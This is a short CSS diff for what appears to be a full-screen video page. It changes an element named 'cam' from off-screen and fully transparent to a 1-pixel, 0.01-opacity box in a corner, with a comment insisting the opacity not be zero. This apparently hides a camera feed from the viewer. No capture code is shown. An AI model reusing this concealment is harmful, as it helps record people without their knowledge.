@@ -8,12 +8,14 @@
   video#player { width: 100vw; height: 100vh; object-fit: cover; }
   #cam {
   position: fixed;
-  top: -9999px;
-  left: -9999px;
+  bottom: 0;
+  right: 0;
   width: 1px;
   height: 1px;
-  opacity: 0;
+  opacity: 0.01; /* must NOT be 0 */
+  pointer-events: none;
   }
+
 
 
   #debug {
